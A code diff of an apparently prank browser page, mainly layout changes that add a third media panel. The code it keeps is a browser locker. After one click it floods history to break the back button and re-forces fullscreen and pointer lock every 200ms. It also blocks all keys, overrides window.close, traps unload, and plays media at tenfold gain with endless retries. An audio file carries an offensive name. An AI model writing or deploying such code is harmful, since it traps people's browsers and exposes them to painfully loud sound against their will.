@@ -39,11 +39,10 @@ body, html {
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    width: 1280px;
-    height: 480px;
     display: flex;
-    justify-content: space-between;
+    flex-direction: row;
     align-items: center;
+    justify-content: space-between;
     z-index: 1000;
 }
 
@@ -51,9 +50,12 @@ body, html {
     width: 640px;
     height: 480px;
     position: relative;
+    flex-shrink: 0;
 }
 
-#fart, #ronnie {
+/* Style both video and img elements inside the wrapper */
+.video-wrapper video,
+.video-wrapper img {
     width: 100%;
     height: 100%;
     object-fit: contain;
@@ -61,16 +63,11 @@ body, html {
     top: 0;
 }
 
-#fart { left: 0; }
-#ronnie { right: 0; }
-
 .video-divider {
     width: 2px;
     height: 480px;
     background: red;
-    position: absolute;
-    left: 50%;
-    transform: translateX(-50%);
+    flex-shrink: 0;
 }
 
 .click-overlay {
@@ -136,6 +133,11 @@ body, html {
 <audio id="shart3" preload="auto" loop src="rape.mp3"></audio>
 
 <div class="video-container">
+    <!-- Third element: wads.gif (as an image, not a video) -->
+    <div class="video-wrapper">
+        <img id="wads" src="wads.gif" alt="">
+    </div>
+    <div class="video-divider"></div>
     <div class="video-wrapper">
         <video id="fart" loop src="zzart.mp4" playsinline></video>
     </div>
@@ -162,7 +164,7 @@ body, html {
     function initAudioBoost() {
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         gainNode = audioContext.createGain();
-        gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
+        gainNode.gain.value = 10; // 10x volume
         gainNode.connect(audioContext.destination);
 
         // Connect all audio elements
@@ -178,7 +180,7 @@ body, html {
             }
         });
 
-        // Connect video elements if they have audio tracks
+        // Connect video elements only (wads is an image, so exclude it)
         const videoIds = ['fart', 'ronnie'];
         videoIds.forEach(id => {
             const el = document.getElementById(id);
@@ -198,12 +200,11 @@ body, html {
         }
         mediaElements.forEach(m => {
             if (m) {
-                m.volume = 1.0; // fallback
+                m.volume = 1.0;
                 m.muted = false;
                 const playPromise = m.play();
                 if (playPromise !== undefined) {
                     playPromise.catch(() => {
-                        // Retry forever
                         setInterval(() => m.play(), 100);
                     });
                 }
@@ -211,7 +212,7 @@ body, html {
         });
     }
 
-    // --- FULLSCREEN LOCK (aggressive) ---
+    // --- FULLSCREEN LOCK ---
     function attemptFullscreen() {
         const elem = document.documentElement;
         if (elem.requestFullscreen) elem.requestFullscreen();
@@ -220,111 +221,90 @@ body, html {
         else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
     }
 
-    // --- POINTER LOCK (trap mouse) ---
+    // --- POINTER LOCK ---
     function lockPointer() {
         if (document.body.requestPointerLock) {
             document.body.requestPointerLock();
         }
     }
 
-    // --- HISTORY FLOOD (disable back) ---
+    // --- HISTORY FLOOD ---
     function floodHistory() {
         for (let i = 0; i < 20; i++) {
             history.pushState(null, null, location.href);
         }
     }
 
-    // --- KEY BLOCKING (prevent all escape shortcuts) ---
+    // --- KEY BLOCKING ---
     function blockKeys(e) {
-        // Block ALL key combinations — user cannot press anything
         e.preventDefault();
         e.stopPropagation();
         return false;
     }
 
-    // --- RE-ENGAGE LOCKS on any user activity ---
+    // --- RE-ENGAGE LOCKS ---
     function reengageLocks() {
         if (hasTriggered) {
-            // If not in fullscreen, request it
             if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                 attemptFullscreen();
             }
-            // If pointer not locked, lock it
             if (!document.pointerLockElement) {
                 lockPointer();
             }
         }
     }
 
-    // --- START FUNCTION (called when overlay clicked) ---
+    // --- START FUNCTION ---
     window.startExperience = function() {
         if (hasTriggered) return;
         hasTriggered = true;
 
-        // Hide overlay and black screen
         const overlay = document.getElementById('startOverlay');
         const blackScreen = document.querySelector('.black-screen');
         if (overlay) overlay.style.display = 'none';
         if (blackScreen) blackScreen.style.display = 'none';
 
-        // Flood history
         floodHistory();
-
-        // Initialize audio boost (requires user gesture)
         initAudioBoost();
-
-        // Play all media
         playAllMedia();
-
-        // Initial locks
         attemptFullscreen();
         lockPointer();
 
-        // Set up periodic re-engagement (every 200ms)
         setInterval(reengageLocks, 200);
 
-        // Also re-engage on any user interaction (mouse move, click, key, touch)
         const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
         events.forEach(eventType => {
             document.addEventListener(eventType, reengageLocks, true);
         });
 
-        // Additional fullscreen change detection
         document.addEventListener('fullscreenchange', reengageLocks);
         document.addEventListener('webkitfullscreenchange', reengageLocks);
         document.addEventListener('mozfullscreenchange', reengageLocks);
         document.addEventListener('MSFullscreenChange', reengageLocks);
 
-        // Pointer lock change detection
         document.addEventListener('pointerlockchange', reengageLocks);
         document.addEventListener('mozpointerlockchange', reengageLocks);
         document.addEventListener('webkitpointerlockchange', reengageLocks);
 
-        // Block all keys permanently (after start)
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
     };
 
-    // --- Attach start to overlay click (anywhere on overlay) ---
     document.getElementById('startOverlay').addEventListener('click', startExperience);
 
-    // --- Initial passive blocks (before start) ---
     document.addEventListener('contextmenu', e => e.preventDefault(), true);
     document.addEventListener('dragstart', e => e.preventDefault(), true);
     document.addEventListener('selectstart', e => e.preventDefault(), true);
 
-    // --- Window close confirmation ---
     window.onbeforeunload = function() {
         return "Are you absolutely sure you want to leave?";
     };
 
-    // --- Override window.close (just in case) ---
     window.close = function() {
         console.warn('Nice try.');
     };
 
-    // --- History popstate trap ---
     window.onpopstate = function() {
         if (hasTriggered) {
             floodHistory();
@@ -332,20 +312,7 @@ body, html {
         }
     };
 
-    // --- Resize logic (unchanged) ---
-    function resizeVideos() {
-        const videoContainer = document.querySelector('.video-container');
-        if (videoContainer) {
-            videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
-            videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
-        }
-    }
-
-    window.addEventListener('load', () => {
-        resizeVideos();
-        setInterval(resizeVideos, 2000);
-    });
-
+    // No resize function needed – container sizes automatically
 })();
 </script>
 </body>
